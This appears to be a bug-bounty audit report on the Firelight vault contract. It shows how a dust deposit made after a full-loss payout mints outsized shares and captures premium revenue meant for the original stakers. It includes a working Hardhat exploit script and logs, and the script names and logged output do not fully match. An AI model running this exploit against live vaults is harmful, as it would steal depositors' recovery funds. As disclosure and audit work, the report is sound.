# 90282 sc medium once payout drives totalassets to 0 with shares still outstanding share pricing degenerates any address can mint totalsupply 1 shares per wei of deposit capturing&#x20;

**Submitted on Aug 24th 2026 at 07:14:57 UTC by @Another for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #90282
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

`_convertToSharesTotals` prices a deposit as `assets · (totalSupply + 1) / (totalAssets + 1)`. That is correct while the pool holds assets. It degenerates when `totalAssets()` reaches zero with `totalSupply()` still large — the denominator collapses to `1`, so every wei deposited mints `totalSupply + 1` shares.

Phase 2 makes that state reachable by design. A full-loss incident payout drains the active pool; `_decreaseIncident` then clears `hasActiveIncident`, deposits reopen in the same or the following period (same-period reopen requires the assessment to close while still in the capture period and the prior period to be incident-free, since `_hasActiveIncident()` also checks `period - 1`), and the vault continues operating on premium revenue forwarded by `VaultRewardDistributor`. The stakers who bore the loss are the ones that revenue is meant to make whole. A dust depositor arriving between the payout and the next distribution takes almost all of it.

Phase 1 could not reach this state: with no `payout()`, `totalAssets()` never fell.

## Vulnerability Details

`contracts/core/FirelightVault.sol`:

```solidity
    function _convertToSharesTotals(
        uint256 assets,
        uint256 totSupply,
        uint256 totAssets,
        Math.Rounding rounding
    ) private view returns (uint256) {
        return assets.mulDiv(totSupply + 10 ** _decimalsOffset(), totAssets + 1, rounding);
    }
```

`_decimalsOffset()` is not overridden, so it is `0` and the numerator term is `totSupply + 1`. With `totAssets == 0` the expression is exactly `assets · (totSupply + 1)`.

The only guards on `_depositFunds` are a zero-share check and the deposit cap:

```solidity
        if (shares == 0) revert InvalidAmount();
        ...
        if (_totalAssets > depositLimit) revert DepositLimitExceeded();
```

Neither constrains the share count. A 10-wei deposit into a pool holding `3000e18` shares and zero assets mints `3.0e22` shares — ten times the entire existing supply.

Nothing blocks the deposit either. `maxDeposit` returns `depositLimit - totalAssets()`, which is the full limit when assets are zero, and `_hasActiveIncident()` is false as soon as the incident closes:

```solidity
    function _decreaseIncident(uint256 period) internal {
        ...
        if (count == 0) {
            $.vault.setActiveIncident(period, false);
        }
    }
```

so the deposit window opens in the very transaction that finishes draining the vault.

NB: This is not the classic ERC4626 inflation attack and the usual mitigation does not apply. The standard attack inflates `totalAssets` by donation to round a victim's shares down to zero; raising `_decimalsOffset()` fixes that. Here the failure runs the other way — `totalAssets` collapses toward zero and the share count explodes. Increasing the offset makes the numerator larger and the problem slightly worse, not better.

The severity degrades gracefully rather than cliff-edging, which widens the window considerably. Cost to acquire half the vault is approximately the assets remaining:

| Loss taken | Assets remaining | Cost of a 50% stake |
| ---------- | ---------------- | ------------------- |
| 100%       | 0                | 1 wei               |
| 99.9999%   | 0.001            | 0.001               |
| 99%        | 10               | 10                  |
| 50%        | 500              | 500                 |

At 50% impairment the pricing is fair — paying 500 to double a 500-asset pool earns half of it. Only as assets approach zero does the price of control detach from the value of what is being bought, because NAV does not include the vault's claim on future premium revenue.

## Impact Details

Verified end-to-end:

1. 90.9% of the vault acquired for 10 wei. Three LPs deposited 1000 each; a full-loss payout took all 3000; the attacker deposited 10 wei and received `3.0e22` shares against an existing supply of `3.0e21`.
2. 545 of 600 assets of subsequent premium revenue captured. The three original LPs, who contributed 3000, were left with 54.5 between them.
3. It attacks the recovery mechanism specifically. The protocol is designed to survive a full loss and rebuild through premium flow. This converts that design property into the attack's payoff.

## References

* `contracts/core/FirelightVault.sol`: (`_convertToSharesTotals`), (`deposit`), `_depositFunds`, `maxDeposit`, `_hasActiveIncident`
* `contracts/core/FirelightVault.sol`: (`payout`, the sink that makes `totalAssets == 0` reachable)
* `contracts/core/IncidentManager.sol` `_decreaseIncident` (clears the deposit block on close)
* `contracts/core/VaultRewardDistributor.sol` `distributeRewards` / `distributeIncentive` (the captured revenue stream)

## Proof of Concept

## Proof of Concept

```bash
mkdir firelight-poc && cd firelight-poc
npm init -y
npm i --legacy-peer-deps -D hardhat@2.22.17 @nomicfoundation/hardhat-ethers@^3.0.8 ethers@6
npm i @openzeppelin/contracts@5.1.0 @openzeppelin/contracts-upgradeable@5.1.0
# copy the contracts/ tree in; the fasset/ subtree is not needed for these PoCs
# and pulls flare-smart-contracts-v2, so it can be removed
npx hardhat compile
npx hardhat run scripts/poc-finding1.js
```

`hardhat.config.js`:

```js
require("@nomicfoundation/hardhat-ethers");
module.exports = {
  solidity: { version: "0.8.28", settings: { optimizer: { enabled: true, runs: 200 }, viaIR: true } },
  networks: { hardhat: { allowUnlimitedContractSize: true } },
  paths: { sources: "./contracts", tests: "./scripts" },
};
```

`contracts/harness/Harness.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
contract Proxy is ERC1967Proxy {
    constructor(address impl, bytes memory data) ERC1967Proxy(impl, data) {}
}
```

`scripts/stack.js` — deploys vault + CoverNFT + allocator + IncidentManager behind proxies and wires the roles:

```js
const { ethers } = require("hardhat");
const DAY = 24 * 60 * 60;

async function deployStack({
  assetDecimals = 18,
  depositLimit = ethers.parseUnits("1000000000", 18),
  duration = DAY,
  priceDecimals = 8,
  price = 100000000n,            // $1.00
  minCAR = 12000n,
  effectiveLeverage = 12000n,    // leverage/minCAR == 1 -> capacity == collateral
  divergenceToleranceBps = 0,
} = {}) {
  const signers = await ethers.getSigners();
  const [admin, ...users] = signers;
  const flbWallet = signers[15];
  const premiumCollector = signers[14];

  const MockERC20 = await ethers.getContractFactory("MockERC20");
  const asset = await MockERC20.deploy("Asset", "AST", assetDecimals);
  await asset.waitForDeployment();

  const VaultImpl = await ethers.getContractFactory("FirelightVault");
  const vaultImpl = await VaultImpl.deploy();
  await vaultImpl.waitForDeployment();

  const initParams = ethers.AbiCoder.defaultAbiCoder().encode(
    ["tuple(address,address,address,address,address,address,uint256,uint48)"],
    [[admin.address, admin.address, admin.address, admin.address,
      admin.address, admin.address, depositLimit, duration]]
  );
  const Proxy = await ethers.getContractFactory("contracts/harness/Harness.sol:Proxy");
  const vaultProxy = await Proxy.deploy(
    await vaultImpl.getAddress(),
    VaultImpl.interface.encodeFunctionData("initialize", [
      await asset.getAddress(), "Firelight Vault", "fVLT", initParams])
  );
  await vaultProxy.waitForDeployment();
  const vault = VaultImpl.attach(await vaultProxy.getAddress());
  for (const r of ["PAYOUT_ROLE", "PAYOUT_ALLOWLIST_ROLE", "INCIDENT_ROLE", "CHECKPOINT_ROLE"]) {
    await vault.grantRole(await vault[r](), admin.address);
  }

  const NFTImpl = await ethers.getContractFactory("CoverNFT");
  const nftImpl = await NFTImpl.deploy();
  await nftImpl.waitForDeployment();
  const nftProxy = await Proxy.deploy(
    await nftImpl.getAddress(),
    NFTImpl.interface.encodeFunctionData("initialize", [
      "Cover", "CVR", "", admin.address, admin.address, admin.address, admin.address])
  );
  await nftProxy.waitForDeployment();
  const coverNFT = NFTImpl.attach(await nftProxy.getAddress());

  const Feed = await ethers.getContractFactory("MockAggregatorV3");
  const feed = await Feed.deploy(priceDecimals, price);
  await feed.waitForDeployment();

  const flbToken = await MockERC20.deploy("FLB", "FLB", 6);
  await flbToken.waitForDeployment();
  const premiumToken = await MockERC20.deploy("Premium", "PRM", 6);
  await premiumToken.waitForDeployment();

  const AllocImpl = await ethers.getContractFactory("CoverOrderAllocator");
  const allocImpl = await AllocImpl.deploy();
  await allocImpl.waitForDeployment();

  const allocInit = {
    vault: await vault.getAddress(),
    premiumCollector: premiumCollector.address,
    coverNFT: await coverNFT.getAddress(),
    priceFeedAdapter: await feed.getAddress(),
    maxPriceAge: 86400,
    premiumTokens: [await premiumToken.getAddress()],
    admin: admin.address,
    adminRole: admin.address,
    curatorRole: admin.address,
    allocatorRole: admin.address,
    configAdminRole: admin.address,
    initialProtocolConcentrations: [
      { chainId: 1, protocol: "aave", maxProtocolConcentrationBps: 10000 },
    ],
    newMarkets: [
      { chainId: 1, protocol: "aave", market: ethers.zeroPadValue("0x01", 32) },
    ],
    capacityConfig: {
      minCAR,
      firstLossBufferToken: await flbToken.getAddress(),
      firstLossBuffer: flbWallet.address,
      effectiveLeverage,
      minOrderMarketCoverAmount: 1,
      divergenceToleranceBps,
    },
  };
  const allocProxy = await Proxy.deploy(
    await allocImpl.getAddress(),
    AllocImpl.interface.encodeFunctionData("initialize", [allocInit])
  );
  await allocProxy.waitForDeployment();
  const allocator = AllocImpl.attach(await allocProxy.getAddress());
  await coverNFT.grantRole(await coverNFT.MINTER_ROLE(), await allocator.getAddress());

  const IMImpl = await ethers.getContractFactory("IncidentManager");
  const imImpl = await IMImpl.deploy();
  await imImpl.waitForDeployment();
  const imProxy = await Proxy.deploy(
    await imImpl.getAddress(),
    IMImpl.interface.encodeFunctionData("initialize", [
      admin.address, admin.address, admin.address, admin.address, admin.address,
      admin.address, admin.address, admin.address,
      signers[13].address,
      await allocator.getAddress(),
      await feed.getAddress(),
      86400,
    ])
  );
  await imProxy.waitForDeployment();
  const incidentManager = IMImpl.attach(await imProxy.getAddress());

  await vault.grantRole(await vault.INCIDENT_ROLE(), await incidentManager.getAddress());
  await vault.grantRole(await vault.PAYOUT_ROLE(), await incidentManager.getAddress());
  await vault.addToPayoutAllowlist(signers[13].address);

  return { admin, users, asset, vault, coverNFT, allocator, incidentManager,
           feed, flbToken, flbWallet, premiumToken, premiumCollector,
           payoutReceiver: signers[13], DAY };
}

async function fund(asset, spender, user, amount) {
  await asset.mint(user.address, amount);
  await asset.connect(user).approve(spender, amount);
}

async function advancePeriod(vault) {
  const end = await vault.currentPeriodEnd();
  await ethers.provider.send("evm_setNextBlockTimestamp", [Number(end) + 1]);
  await ethers.provider.send("evm_mine", []);
}

module.exports = { deployStack, fund, advancePeriod, DAY };
```

### Add the test below to scripts/

```js
// scripts/poc-finding2.js
const { ethers } = require("hardhat");
const { deployStack, fund, advancePeriod } = require("./stack");
const f18 = (x) => ethers.formatUnits(x, 18);

async function main() {
  const { users, asset, vault, payoutReceiver } = await deployStack();
  const lps = [users[0], users[1], users[2]];
  const attacker = users[5];

  const K = ethers.parseUnits("1000", 18);
  for (const u of lps) {
    await fund(asset, await vault.getAddress(), u, K);
    await vault.connect(u).deposit(K, u.address);
  }

  // A full-loss incident drains the active pool.
  await advancePeriod(vault);
  const P = await vault.currentPeriod();
  const pc = await vault.periodConfigurationAtNumber(P);
  const capTs = pc.epoch + (P - pc.startingPeriod) * pc.duration + 10n;
  await vault.payout(payoutReceiver.address, ethers.parseUnits("3000", 18), capTs);

  console.log("after full-loss payout -> totalAssets:", (await vault.totalAssets()).toString(),
              " totalSupply:", (await vault.totalSupply()).toString());

  // Deposits are open again the moment the incident closes.
  const DUST = 10n;
  await fund(asset, await vault.getAddress(), attacker, DUST);
  await vault.connect(attacker).deposit(DUST, attacker.address);
  const attShares = await vault.balanceOf(attacker.address);
  const pct = Number((attShares * 10000n) / (await vault.totalSupply())) / 100;
  console.log("attacker deposits:", DUST.toString(), "wei -> shares:", attShares.toString());
  console.log("attacker now owns:", pct + "% of the vault");

  // Premium revenue flows back in, as the protocol is designed to do.
  await asset.mint(await vault.getAddress(), ethers.parseUnits("600", 18));
  await vault.checkpointTotalAssets();

  let lpClaim = 0n;
  for (const u of lps) lpClaim += await vault.previewRedeem(await vault.balanceOf(u.address));
  console.log("attacker can redeem:", f18(await vault.previewRedeem(attShares)), "(paid 10 wei)");
  console.log("3 original LPs     :", f18(lpClaim), "(paid 3000 combined)");
}
main().catch((e) => { console.error(e); process.exit(1); });
```

### Logs

```
=== EDGE 1: deposit into a fully-drained vault ===
  after full-loss payout -> totalAssets: 0  totalSupply: 3000000000000000000000
  incident closed, deposits re-open (hasActiveIncident cleared)

  attacker deposits: 10 wei
  shares minted    : 30000000000000000000010
  supply before    : 3000000000000000000000
  attacker now owns: 90.9% of the vault

  600 assets of premium revenue arrive:
    attacker can redeem: 545.454545454545454555 (paid 10 wei)
    3 original LPs     : 54.545454545454545454 (paid 3000 combined)
  >>> ~90.9% of ALL future recovery captured for 10 wei

=== EDGE 2: cost of a 50% stake vs remaining assets ===
  drained 100% -> remaining 0.0 assets; 0.000000000000000001 buys 50% of the vault
  drained 99.9999% -> remaining 0.001 assets; 0.001000000000000001 buys 50% of the vault
  drained 99% -> remaining 10.0 assets; 10.000000000000000001 buys 50% of the vault
  drained 50% -> remaining 500.0 assets; 500.000000000000000001 buys 50% of the vault
```
